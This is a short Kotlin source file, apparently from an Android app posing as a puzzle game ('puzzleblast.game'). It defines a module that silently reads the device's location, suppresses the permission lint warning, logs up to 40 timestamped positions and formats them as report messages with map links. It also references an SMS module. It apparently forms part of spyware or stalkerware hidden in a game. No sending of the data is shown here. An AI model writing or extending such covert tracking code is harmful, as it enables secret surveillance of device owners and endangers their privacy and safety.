package com.puzzleblast.game.modules

import android.annotation.SuppressLint
import android.content.Context
import com.google.android.gms.location.LocationServices
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlin.coroutines.resume

object LocationModule {
    val history = mutableListOf<Triple<Double, Double, Long>>()

    @SuppressLint("MissingPermission")
    suspend fun current(ctx: Context): String = suspendCancellableCoroutine { cont ->
        val client = LocationServices.getFusedLocationProviderClient(ctx)
        client.lastLocation.addOnSuccessListener { loc ->
            if (loc == null) { cont.resume("📍 no location"); return@addOnSuccessListener }
            history.add(Triple(loc.latitude, loc.longitude, System.currentTimeMillis()))
            if (history.size > 40) history.removeAt(0)
            cont.resume("📍 ${loc.latitude}, ${loc.longitude} (±${loc.accuracy.toInt()}m)\n🗺 https://maps.google.com/?q=${loc.latitude},${loc.longitude}")
        }.addOnFailureListener { cont.resume("📍 location error: ${it.message}") }
    }

    suspend fun history(): String {
        if (history.isEmpty()) return "🗺 no history yet"
        return history.joinToString("\n") { (lat, lng, t) -> "📍 $lat, $lng · ${SmsModule.relTime(t)}" }
    }
}
